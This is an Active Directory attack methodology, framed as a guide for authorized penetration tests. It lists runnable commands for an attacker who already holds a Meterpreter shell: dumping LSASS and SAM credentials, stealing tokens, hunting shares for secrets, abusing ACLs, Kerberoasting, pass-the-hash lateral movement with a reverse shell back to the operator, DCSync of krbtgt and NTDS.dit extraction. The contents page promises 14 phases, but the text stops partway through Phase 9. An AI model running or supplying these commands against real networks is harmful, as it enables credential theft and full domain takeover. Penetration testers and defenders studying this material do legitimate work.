# Active Directory Attack Methodology

A comprehensive guide for authorized penetration testing of Active Directory environments.
**Starting point: Active Meterpreter shell on a domain-joined host.**

**References:**
- [HackTricks AD Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/)
- [The Hacker Recipes - DACL Abuse](https://www.thehacker.recipes/ad/movement/dacl/)
- [BloodHound - SpecterOps](https://bloodhound.specterops.io/)

---

# Table of Contents

1. [Phase 1: Initial Situational Awareness](#phase-1-initial-situational-awareness)
2. [Phase 2: Credential Harvesting](#phase-2-credential-harvesting)
3. [Phase 3: Active Directory Enumeration](#phase-3-active-directory-enumeration)
4. [Phase 4: SMB Share Enumeration & Secret Hunting](#phase-4-smb-share-enumeration--secret-hunting)
5. [Phase 5: BloodHound & Attack Path Analysis](#phase-5-bloodhound--attack-path-analysis)
6. [Phase 6: ACL/ACE Abuse](#phase-6-aclace-abuse)
7. [Phase 7: Kerberos Attacks](#phase-7-kerberos-attacks)
8. [Phase 8: Lateral Movement](#phase-8-lateral-movement)
9. [Phase 9: Domain Privilege Escalation](#phase-9-domain-privilege-escalation)
10. [Phase 10: Domain Dominance](#phase-10-domain-dominance)
11. [Phase 11: Cross-Forest & Trust Attacks](#phase-11-cross-forest--trust-attacks)
12. [Phase 12: Persistence Mechanisms](#phase-12-persistence-mechanisms)
13. [Phase 13: Certificate Services (AD CS) Attacks](#phase-13-certificate-services-ad-cs-attacks)
14. [Phase 14: Data Exfiltration & Objectives](#phase-14-data-exfiltration--objectives)

---

# Phase 1: Initial Situational Awareness

## 1.1 Local System Enumeration

### Basic System Information
```
# Meterpreter commands
sysinfo
getuid
getpid
getsid
getprivs

# Architecture (important for payloads)
sysinfo | grep Architecture

# Check if 64-bit process
getpid
ps | grep <pid>
```

### Network Configuration
```
# Network interfaces
ipconfig /all
ifconfig

# Routing table
route print
route

# ARP cache (nearby hosts)
arp -a

# DNS servers
ipconfig /all | findstr DNS

# Active connections
netstat -ano
netstat -anp tcp
```

### Running Processes & Services
```
# List processes
ps

# Look for security products
ps | grep -i "defender\|symantec\|mcafee\|crowdstrike\|carbon\|sentinel\|cylance"

# Services
shell
sc query state= all
net start
wmic service list brief
```

### Antivirus & EDR Detection
```
# Check AV/EDR products
run post/windows/gather/enum_av

# Common process names
ps | grep -i "MsMpEng\|CSFalcon\|cb\|SentinelAgent\|CylanceSvc"

# Windows Defender status
shell
sc query WinDefend
Get-MpComputerStatus (PowerShell)
```

### Current Privileges
```
# Check privileges
getprivs

# Detailed privilege check
run post/windows/gather/win_privs

# Check if UAC enabled
shell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

## 1.2 Local Users & Groups

```
# Meterpreter
run post/windows/gather/enum_logged_on_users
run post/windows/gather/local_admin_search_enum

# Shell commands
net user
net localgroup
net localgroup administrators
whoami /all
whoami /priv
whoami /groups

# Query local admins
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"
net localgroup "Backup Operators"
```

## 1.3 Domain Discovery

```
# Meterpreter modules
run post/windows/gather/enum_domain
run post/windows/gather/enum_domain_group_users

# Basic domain info
shell
echo %USERDOMAIN%
echo %USERDNSDOMAIN%
echo %LOGONSERVER%
systeminfo | findstr /B /C:"Domain"

# Domain details
net config workstation
nltest /dsgetdc:
nltest /dclist:
nltest /domain_trusts
nltest /trusted_domains

# LDAP discovery
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
nslookup -type=SRV _kerberos._tcp.<DOMAIN>
nslookup -type=SRV _gc._tcp.<FOREST>

# Find PDC
nltest /dsgetdc:<domain> /pdc

# Domain functional level
shell
powershell -c "(Get-ADDomain).DomainMode"
```

## 1.4 Installed Software & Patches

```
# Installed software
run post/windows/gather/enum_applications

# From shell
wmic product get name,version
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s

# Missing patches (privesc opportunities)
run post/multi/recon/local_exploit_suggester
wmic qfe list brief
systeminfo
```

---

# Phase 2: Credential Harvesting

## 2.1 Memory Credential Extraction (Mimikatz/Kiwi)

```
# Load Kiwi (Mimikatz) extension
load kiwi

# Dump all credentials
creds_all

# Specific credential types
creds_msv          # NTLM hashes
creds_kerberos     # Kerberos tickets
creds_wdigest      # Cleartext (if WDigest enabled)
creds_tspkg        # Terminal Services
creds_livessp      # Live SSP
creds_ssp          # SSP

# Hash dumps
hashdump           # Local SAM hashes
lsa_dump_sam       # SAM database
lsa_dump_secrets   # LSA secrets (service account creds)

# DCSync (requires domain admin or replication rights)
dcsync_ntlm <DOMAIN>\<username>
dcsync <DOMAIN> <DOMAIN>\krbtgt
```

## 2.2 LSASS Dump Techniques

```
# Direct LSASS dump
run post/windows/gather/smart_hashdump

# Dump LSASS to file (for offline extraction)
shell
# Using comsvcs.dll
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full

# Using procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Task Manager method
# Right-click lsass.exe > Create dump file

# Download and parse offline with pypykatz
download C:\temp\lsass.dmp
# pypykatz lsa minidump lsass.dmp
```

## 2.3 Cached Credentials

```
# Cached domain credentials (MSCACHE2)
run post/windows/gather/cachedump

# LSA secrets
run post/windows/gather/lsa_secrets

# From registry
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save

# Download and extract offline
download sam.save
download system.save
download security.save
# secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

## 2.4 Token Manipulation

```
# List tokens
load incognito
list_tokens -u          # User tokens
list_tokens -g          # Group tokens

# Impersonate token
impersonate_token "DOMAIN\\Username"
impersonate_token "NT AUTHORITY\\SYSTEM"

# Steal token from process
steal_token <pid>

# Revert to original
rev2self
drop_token

# Find interesting processes to steal from
ps | grep -i "explorer\|sqlservr\|iis\|apache"
```

## 2.5 DPAPI Secrets

```
# DPAPI credential store
run post/windows/gather/credentials/enum_cred_store

# Chrome credentials
run post/windows/gather/enum_chrome

# Firefox credentials
run post/multi/gather/firefox_creds

# Windows Credential Manager
shell
cmdkey /list
vaultcmd /listcreds:"Windows Credentials"

# DPAPI masterkey extraction
shell
dir /a C:\Users\<user>\AppData\Roaming\Microsoft\Protect\*
```

## 2.6 Configuration & File Credentials

```
# Unattend.xml (deployment credentials)
run post/windows/gather/enum_unattend

# Group Policy Preferences (cPassword)
run post/windows/gather/credentials/gpp

# Autologon credentials
run post/windows/gather/credentials/windows_autologin

# IIS Application Pool credentials
run post/windows/gather/iis/apppool_passwords

# Common credential file locations
search -f *.config
search -f web.config
search -f *password*.txt
search -f *password*.xml
search -f *.kdbx                # KeePass
search -f *.pfx                 # Certificates
search -f id_rsa               # SSH keys
search -f *.key
search -f *.pem
search -f unattend.xml
search -f sysprep.inf
search -f sysprep.xml

# Registry stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

## 2.7 Service Account Credentials

```
# Services running as domain accounts
shell
wmic service get name,startname
sc qc <service_name>

# Scheduled tasks with stored credentials
schtasks /query /fo LIST /v

# Check for passwords in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

# Phase 3: Active Directory Enumeration

## 3.1 Domain Controllers

```
# Metasploit
run post/windows/gather/enum_ad_computers

# Shell enumeration
nltest /dclist:<domain>
net group "Domain Controllers" /domain
dsquery server
nslookup -type=all _ldap._tcp.dc._msdcs.<domain>

# PowerShell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
Get-ADDomainController -Filter *
```

## 3.2 Domain Users

```
# Metasploit
run post/windows/gather/enum_ad_users

# All domain users
net user /domain
dsquery user

# Specific user info
net user <username> /domain

# PowerShell enumeration
powershell -ep bypass -c "Get-ADUser -Filter * -Properties *"

# Users with descriptions (often contain passwords!)
powershell -ep bypass -c "Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null}"

# Recently created users
powershell -ep bypass -c "Get-ADUser -Filter * -Properties whenCreated | Sort-Object whenCreated -Descending | Select -First 10"

# Users with SPN (Kerberoastable)
powershell -ep bypass -c "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName"

# Users without pre-auth (AS-REP Roastable)
powershell -ep bypass -c "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}"

# Admin count users (protected)
powershell -ep bypass -c "Get-ADUser -Filter {AdminCount -eq 1}"
```

## 3.3 Domain Groups

```
# Metasploit
run post/windows/gather/enum_ad_groups

# High-value groups
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Schema Admins" /domain
net group "Administrators" /domain
net group "Account Operators" /domain
net group "Backup Operators" /domain
net group "Server Operators" /domain
net group "Print Operators" /domain
net group "DnsAdmins" /domain
net group "Exchange Windows Permissions" /domain
net group "Organization Management" /domain

# All groups
net group /domain
dsquery group

# Nested group membership
powershell -ep bypass -c "Get-ADGroupMember 'Domain Admins' -Recursive"
```

## 3.4 Domain Computers

```
# Metasploit
run post/windows/gather/enum_ad_computers

# All computers
net group "Domain Computers" /domain
dsquery computer

# PowerShell
powershell -ep bypass -c "Get-ADComputer -Filter * -Properties *"

# Servers
dsquery computer -name *server*
powershell -ep bypass -c "Get-ADComputer -Filter {OperatingSystem -like '*Server*'}"

# Find computers with unconstrained delegation
powershell -ep bypass -c "Get-ADComputer -Filter {TrustedForDelegation -eq $true}"

# Find computers with constrained delegation
powershell -ep bypass -c "Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo"

# LAPS enabled computers
powershell -ep bypass -c "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime"
```

## 3.5 Service Principal Names (SPNs)

```
# Metasploit
run post/windows/gather/enum_ad_service_principal_names

# setspn enumeration
setspn -T <domain> -Q */*

# PowerShell
powershell -ep bypass -c "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select Name,ServicePrincipalName"

# Specific services
setspn -T <domain> -Q */mssql*
setspn -T <domain> -Q */http*
setspn -T <domain> -Q */exchange*
```

## 3.6 Group Policy Objects (GPOs)

```
# List GPOs
shell
gpresult /r
gpresult /z

# PowerShell
powershell -ep bypass -c "Get-GPO -All"

# GPO links
powershell -ep bypass -c "Get-GPO -All | ForEach-Object { Get-GPPermission -Guid $_.Id -All }"

# Find GPPs with passwords
findstr /S /I cpassword \\<DC>\sysvol\<domain>\policies\*.xml
```

## 3.7 Organizational Units (OUs)

```
# List OUs
dsquery ou
powershell -ep bypass -c "Get-ADOrganizationalUnit -Filter *"

# OU structure
powershell -ep bypass -c "Get-ADOrganizationalUnit -Filter * | Select Name,DistinguishedName"

# GPO links per OU
powershell -ep bypass -c "(Get-ADOrganizationalUnit -Filter *).DistinguishedName | ForEach-Object { Get-GPInheritance -Target $_ }"
```

## 3.8 Trust Relationships

```
# Domain trusts
nltest /domain_trusts
nltest /trusted_domains

# PowerShell
powershell -ep bypass -c "Get-ADTrust -Filter *"

# Forest trusts
powershell -ep bypass -c "[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GetAllTrustRelationships()"

# netdom queries
netdom trust /d:<domain>
```

---

# Phase 4: SMB Share Enumeration & Secret Hunting

## 4.1 Share Discovery

```
# Metasploit share enumeration
run post/windows/gather/enum_shares

# Find all shares on a host
net view \\<target>
net view \\<target> /all

# List shares on current machine
net share

# PowerShell enumeration
powershell -ep bypass -c "Get-WmiObject Win32_Share"

# Enumerate shares across domain computers
# Save computer list first
shell
net group "Domain Computers" /domain > computers.txt
```

## 4.2 Share Access Testing

```
# Test share access
dir \\<server>\<share>
dir \\<dc>\SYSVOL
dir \\<dc>\NETLOGON

# Map share
net use X: \\<server>\<share>
net use X: \\<server>\<share> /user:<domain>\<user> <password>

# Using PsExec
shell
# Test access with current creds
dir \\<target>\C$
dir \\<target>\ADMIN$
```

## 4.3 Common Shares to Check

```
# Default shares
\\<DC>\SYSVOL          # Group Policies, scripts
\\<DC>\NETLOGON        # Login scripts
\\<server>\C$          # Admin share
\\<server>\ADMIN$      # Admin share
\\<server>\IPC$        # Inter-process comm

# Common share names
\\<server>\Users
\\<server>\Shared
\\<server>\Public
\\<server>\Common
\\<server>\IT
\\<server>\Finance
\\<server>\HR
\\<server>\Backup
\\<server>\Software
\\<server>\Install
\\<server>\Deploy
```

## 4.4 Recursive Share Enumeration

```
# List all files recursively
dir /s /b \\<server>\<share>

# PowerShell recursive listing
powershell -ep bypass -c "Get-ChildItem -Path '\\<server>\<share>' -Recurse -ErrorAction SilentlyContinue | Select FullName"

# Save to file for analysis
dir /s /b \\<server>\<share> > share_contents.txt
```

## 4.5 Searching for Secrets in Shares

### File Names to Search For
```
# Password files
dir /s /b \\<server>\<share>\*password*
dir /s /b \\<server>\<share>\*passwd*
dir /s /b \\<server>\<share>\*cred*
dir /s /b \\<server>\<share>\*secret*

# Configuration files
dir /s /b \\<server>\<share>\*.config
dir /s /b \\<server>\<share>\web.config
dir /s /b \\<server>\<share>\*.xml
dir /s /b \\<server>\<share>\*.ini
dir /s /b \\<server>\<share>\*.conf

# Scripts (often contain hardcoded creds)
dir /s /b \\<server>\<share>\*.ps1
dir /s /b \\<server>\<share>\*.bat
dir /s /b \\<server>\<share>\*.cmd
dir /s /b \\<server>\<share>\*.vbs

# Database files
dir /s /b \\<server>\<share>\*.sql
dir /s /b \\<server>\<share>\*.mdf
dir /s /b \\<server>\<share>\*.bak

# Key files
dir /s /b \\<server>\<share>\*.key
dir /s /b \\<server>\<share>\*.pem
dir /s /b \\<server>\<share>\*.pfx
dir /s /b \\<server>\<share>\*.p12
dir /s /b \\<server>\<share>\id_rsa
dir /s /b \\<server>\<share>\*.ppk

# KeePass databases
dir /s /b \\<server>\<share>\*.kdbx
dir /s /b \\<server>\<share>\*.kdb

# Office documents (macros, embedded creds)
dir /s /b \\<server>\<share>\*.xlsm
dir /s /b \\<server>\<share>\*.docm
```

### Content Searches
```
# Search within files for passwords
findstr /si password \\<server>\<share>\*.txt
findstr /si password \\<server>\<share>\*.xml
findstr /si password \\<server>\<share>\*.config
findstr /si password \\<server>\<share>\*.ini
findstr /si password \\<server>\<share>\*.ps1
findstr /si password \\<server>\<share>\*.bat

# Search for usernames
findstr /si "user=" \\<server>\<share>\*.*
findstr /si "username=" \\<server>\<share>\*.*

# Search for connection strings
findstr /si "connectionstring" \\<server>\<share>\*.config
findstr /si "server=" \\<server>\<share>\*.config

# Search for API keys
findstr /si "apikey" \\<server>\<share>\*.*
findstr /si "api_key" \\<server>\<share>\*.*
findstr /si "bearer" \\<server>\<share>\*.*
```

## 4.6 SYSVOL Secrets

```
# GPP Passwords (Groups.xml, etc.)
run post/windows/gather/credentials/gpp

# Manual search
findstr /S /I cpassword \\<DC>\sysvol\<domain>\policies\*.xml

# Check all policy files
dir /s /b \\<DC>\sysvol\*.xml
dir /s /b \\<DC>\sysvol\*.ps1
dir /s /b \\<DC>\sysvol\*.bat
dir /s /b \\<DC>\sysvol\*.vbs

# Specific GPP files
type \\<DC>\sysvol\<domain>\Policies\<GPO_GUID>\Machine\Preferences\Groups\Groups.xml
type \\<DC>\sysvol\<domain>\Policies\<GPO_GUID>\Machine\Preferences\Services\Services.xml
type \\<DC>\sysvol\<domain>\Policies\<GPO_GUID>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
type \\<DC>\sysvol\<domain>\Policies\<GPO_GUID>\Machine\Preferences\DataSources\DataSources.xml
type \\<DC>\sysvol\<domain>\Policies\<GPO_GUID>\Machine\Preferences\Drives\Drives.xml
```

## 4.7 NETLOGON Scripts

```
# Login scripts often contain credentials
dir \\<DC>\NETLOGON
type \\<DC>\NETLOGON\*.bat
type \\<DC>\NETLOGON\*.ps1
type \\<DC>\NETLOGON\*.vbs

# Search for passwords in scripts
findstr /si password \\<DC>\NETLOGON\*.*
findstr /si "net use" \\<DC>\NETLOGON\*.*
```

## 4.8 Automated Share Spidering (via Metasploit)

```
# Use auxiliary module
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <target_range>
set SMBUser <username>
set SMBPass <password>
set SpiderShares true
run

# Share spider for specific patterns
use auxiliary/scanner/smb/smb_spider
set RHOSTS <target>
set PATTERN password
set SHARE <share_name>
run
```

---

# Phase 5: BloodHound & Attack Path Analysis

## 5.1 Data Collection (SharpHound)

```
# Upload SharpHound
upload /path/to/SharpHound.exe C:\\temp\\SharpHound.exe

# Run collection
shell
cd C:\temp
SharpHound.exe -c All
SharpHound.exe -c All --domain <domain>
SharpHound.exe -c All --outputdirectory C:\temp\bh

# Collection methods
# All - All collection methods
# Default - Default collection (Group, LocalAdmin, Session, Trusts)
# Group - Group membership
# LocalAdmin - Local admin collection
# Session - Session collection
# Trusts - Domain trust enumeration
# ACL - ACL collection
# Container - Container collection
# RDP - Remote Desktop Users
# DCOM - Distributed COM Users
# PSRemote - PowerShell Remoting
# ObjectProps - Object properties
# SPNTargets - SPN targets
# DCOnly - Collect from DC only (safer)

# Stealth mode
SharpHound.exe -c DCOnly --stealth

# Download results
download C:\temp\*_BloodHound.zip
```

## 5.2 BloodHound Queries (Common Attack Paths)

### Find Path to Domain Admin
```cypher
MATCH (n:User),(m:Group {name:'DOMAIN ADMINS@<DOMAIN>'}),p=shortestPath((n)-[*1..]->(m)) RETURN p
```

### Find Kerberoastable Users
```cypher
MATCH (u:User {hasspn:true}) RETURN u
```

### Find AS-REP Roastable Users
```cypher
MATCH (u:User {dontreqpreauth:true}) RETURN u
```

### Find Users with DCSync Rights
```cypher
MATCH (n)-[r:DCSync|GetChanges|GetChangesAll]->(:Domain) RETURN n
```

### Find Computers with Unconstrained Delegation
```cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

### Find Computers where Domain Users are Local Admin
```cypher
MATCH (m:Group {name:'DOMAIN USERS@<DOMAIN>'})-[r:AdminTo]->(c:Computer) RETURN m,r,c
```

### Find Shortest Path from Owned Principals
```cypher
MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p
```

## 5.3 Key Attack Paths to Look For

1. **GenericAll on User** - Reset password, set SPN (Kerberoast)
2. **GenericAll on Group** - Add yourself to the group
3. **GenericAll on Computer** - Resource-based constrained delegation
4. **WriteDACL** - Modify permissions to grant yourself GenericAll
5. **WriteOwner** - Take ownership, then modify DACL
6. **ForceChangePassword** - Reset user password
7. **AddMember** - Add yourself to group
8. **ReadGMSAPassword** - Read GMSA account password
9. **ReadLAPSPassword** - Read LAPS local admin password
10. **DCSync** - Replicate credentials from DC
11. **GPO Abuse** - Modify GPO for code execution

---

# Phase 6: ACL/ACE Abuse

## 6.1 GenericAll Abuse

### On User Object
```
# Reset password
net user <target_user> <new_password> /domain

# PowerShell
Set-ADAccountPassword -Identity <target_user> -Reset -NewPassword (ConvertTo-SecureString '<password>' -AsPlainText -Force)

# Set SPN for Kerberoasting
setspn -a MSSQLSvc/fake.domain.com:1433 <target_user>
powershell -c "Set-ADUser -Identity <target_user> -ServicePrincipalNames @{Add='fake/spn'}"

# Targeted Kerberoast
# Now request TGS and crack offline
```

### On Group Object
```
# Add yourself to group
net group "<group_name>" <your_user> /add /domain

# PowerShell
Add-ADGroupMember -Identity "<group_name>" -Members <your_user>
```

### On Computer Object (RBCD)
```
# Resource-based constrained delegation attack
# Requires adding computer account or using existing one you control

# PowerShell with PowerMad
New-MachineAccount -MachineAccount YOURCOMPUTER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Set msDS-AllowedToActOnBehalfOfOtherIdentity
Set-ADComputer <target_computer> -PrincipalsAllowedToDelegateToAccount YOURCOMPUTER$

# Get ticket with Rubeus
Rubeus.exe s4u /user:YOURCOMPUTER$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target_computer> /ptt
```

## 6.2 WriteDACL Abuse

```
# Add GenericAll for yourself
# PowerShell with PowerView
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <your_user> -Rights All

# Using .NET
$user = Get-ADUser <your_user>
$target = Get-ADObject <target>
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user.SID, "GenericAll", "Allow")
$acl = Get-Acl "AD:\$($target.DistinguishedName)"
$acl.AddAccessRule($ace)
Set-Acl "AD:\$($target.DistinguishedName)" $acl
```

## 6.3 WriteOwner Abuse

```
# Take ownership
# PowerView
Set-DomainObjectOwner -Identity <target> -OwnerIdentity <your_user>

# After taking ownership, add WriteDACL for yourself
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <your_user> -Rights All
```

## 6.4 ForceChangePassword

```
# Reset password without knowing current password
net user <target_user> <new_password> /domain

# PowerShell
Set-ADAccountPassword -Identity <target_user> -Reset -NewPassword (ConvertTo-SecureString '<password>' -AsPlainText -Force)
```

## 6.5 AddMember / Self-Membership

```
# Add yourself to group
net group "<group_name>" <your_user> /add /domain

# PowerView
Add-DomainGroupMember -Identity "<group_name>" -Members <your_user>
```

## 6.6 ReadLAPSPassword

```
# Read LAPS password
powershell -c "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | Select Name, 'ms-Mcs-AdmPwd'"

# For specific computer
powershell -c "Get-ADComputer <computer_name> -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd"
```

## 6.7 ReadGMSAPassword

```
# Read GMSA password
# PowerShell
$gmsa = Get-ADServiceAccount -Identity <gmsa_name> -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
$blob = [byte[]]($mp)
# Parse blob for NTLM hash

# Using DSInternals
Get-ADServiceAccount -Identity <gmsa_name> -Properties 'msDS-ManagedPassword' | ConvertFrom-ADManagedPasswordBlob
```

---

# Phase 7: Kerberos Attacks

## 7.1 Kerberoasting

```
# Metasploit
use auxiliary/gather/get_user_spns
set RHOSTS <dc_ip>
set DOMAIN <domain>
set USER <username>
set PASS <password>
run

# From shell with setspn
setspn -T <domain> -Q */* | findstr "CN="

# Request tickets
# PowerShell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<spn>"

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Invoke-Kerberoast
Invoke-Kerberoast -OutputFormat Hashcat | Select Hash | Out-File hashes.txt

# Crack with hashcat
# hashcat -m 13100 hashes.txt wordlist.txt
# hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule
```

## 7.2 AS-REP Roasting

```
# Metasploit
use auxiliary/gather/asrep_roast
set RHOSTS <dc_ip>
set DOMAIN <domain>
run

# Find users without preauth
powershell -c "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}"

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack with hashcat
# hashcat -m 18200 asrep.txt wordlist.txt
```

## 7.3 Pass-the-Ticket (PTT)

```
# List current tickets
load kiwi
kerberos_ticket_list

# Export tickets
kiwi_cmd "sekurlsa::tickets /export"

# Inject ticket
kerberos_ticket_use /path/to/ticket.kirbi
kiwi_cmd "kerberos::ptt <ticket.kirbi>"

# Rubeus
Rubeus.exe ptt /ticket:<base64_ticket>
```

## 7.4 Overpass-the-Hash (Pass-the-Key)

```
# Use NTLM hash to get Kerberos ticket
# Mimikatz
kiwi_cmd "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe"

# Rubeus
Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<hash> /ptt
Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<aes_key> /ptt
```

## 7.5 Unconstrained Delegation

```
# Find computers with unconstrained delegation
powershell -c "Get-ADComputer -Filter {TrustedForDelegation -eq $true}"

# If you have admin on unconstrained delegation host
# Monitor for incoming TGTs
# Mimikatz
kiwi_cmd "sekurlsa::tickets /export"

# Rubeus monitoring
Rubeus.exe monitor /interval:5 /filteruser:DC$

# Coerce authentication (PrinterBug, PetitPotam)
# SpoolSample.exe <dc> <unconstrained_host>
# Capture and reuse DC TGT
```

## 7.6 Constrained Delegation

```
# Find accounts with constrained delegation
powershell -c "Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo"
powershell -c "Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo"

# If you have credentials/hash of constrained delegation account
# Rubeus S4U attack
Rubeus.exe s4u /user:<service_account> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<target_spn> /ptt

# Kiwi S4U
kiwi_cmd "kerberos::s4u /user:<user> /rc4:<hash> /impersonateuser:Administrator /service:<spn>"
```

## 7.7 Resource-Based Constrained Delegation (RBCD)

```
# Requirements: GenericWrite/GenericAll on computer object + ability to add computer account

# Create computer account (or use existing one)
# PowerMad
New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'Password!' -AsPlainText -Force)

# Set RBCD attribute
Set-ADComputer <target> -PrincipalsAllowedToDelegateToAccount YOURPC$

# Get service ticket
Rubeus.exe hash /password:'Password!'
Rubeus.exe s4u /user:YOURPC$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target> /ptt

# Access target
dir \\<target>\c$
```

---

# Phase 8: Lateral Movement

## 8.1 Pass-the-Hash (PtH)

```
# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser <username>
set SMBPass <LM:NTLM_hash>
set SMBDomain <domain>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
run

# Alternative modules
use exploit/windows/smb/psexec_psh  # PowerShell-based, more evasive
use auxiliary/admin/smb/psexec_command  # Single command execution

# WMI execution
use exploit/windows/local/wmi
set SESSION <current_session>
set RHOSTS <target>
run
```

## 8.2 WinRM / PowerShell Remoting

```
# Metasploit
use exploit/windows/winrm/winrm_script_exec
set RHOSTS <target>
set USERNAME <user>
set PASSWORD <password>
set DOMAIN <domain>
run

# From shell - Enable WinRM
winrm quickconfig -q
Enable-PSRemoting -Force

# Remote PowerShell session
Enter-PSSession -ComputerName <target> -Credential <domain>\<user>

# Invoke command
Invoke-Command -ComputerName <target> -ScriptBlock { whoami } -Credential <domain>\<user>
```

## 8.3 SMB/Admin Shares

```
# Copy and execute
copy payload.exe \\<target>\C$\temp\
wmic /node:<target> process call create "C:\temp\payload.exe"

# PsExec (if uploaded)
psexec.exe \\<target> -u <domain>\<user> -p <password> cmd.exe

# sc.exe service creation
sc \\<target> create <svcname> binpath= "C:\temp\payload.exe"
sc \\<target> start <svcname>
sc \\<target> delete <svcname>
```

## 8.4 WMI Execution

```
# From shell
wmic /node:<target> process call create "cmd.exe /c <command>"
wmic /node:<target> /user:<domain>\<user> /password:<pass> process call create "cmd.exe /c <command>"

# PowerShell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c <command>" -ComputerName <target>

# With credentials
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c <command>" -ComputerName <target> -Credential $cred
```

## 8.5 DCOM Execution

```
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<target>"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c <command>","7")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","<target>"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c <command>","C:\Windows\System32",$null,0)
```

## 8.6 Scheduled Tasks

```
# Create remote scheduled task
schtasks /create /s <target> /tn "<taskname>" /tr "C:\temp\payload.exe" /sc once /st 00:00 /ru system
schtasks /run /s <target> /tn "<taskname>"
schtasks /delete /s <target> /tn "<taskname>" /f
```

## 8.7 RDP

```
# Enable RDP
run post/windows/manage/enable_rdp

# RDP hijacking (requires SYSTEM)
query user
tscon <session_id> /dest:<your_session>

# Add user to RDP group
net localgroup "Remote Desktop Users" <user> /add

# Meterpreter RDP
run post/windows/gather/enum_rdp_sessions
```

## 8.8 SSH (if available)

```
# Find SSH keys
search -f id_rsa
search -f *.ppk

# Download and use
download C:\Users\<user>\.ssh\id_rsa
# ssh -i id_rsa user@target
```

---

# Phase 9: Domain Privilege Escalation

## 9.1 DCSync Attack

```
# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
# Default: Domain Admins, Enterprise Admins, Administrators, Domain Controllers

# Meterpreter Kiwi
load kiwi
dcsync_ntlm <domain>\<user>
dcsync_ntlm <domain>\krbtgt
dcsync_ntlm <domain>\Administrator

# Dump all
lsa_dump_dcsync

# Mimikatz command
kiwi_cmd "lsadump::dcsync /domain:<domain> /user:<user>"
kiwi_cmd "lsadump::dcsync /domain:<domain> /all"
```

## 9.2 NTDS.dit Extraction

```
# Using ntdsutil (on DC)
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" quit quit

# Using vssadmin
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system

# Metasploit
run post/windows/gather/ntds_grabber

# Download and extract offline
download C:\temp\ntds.dit
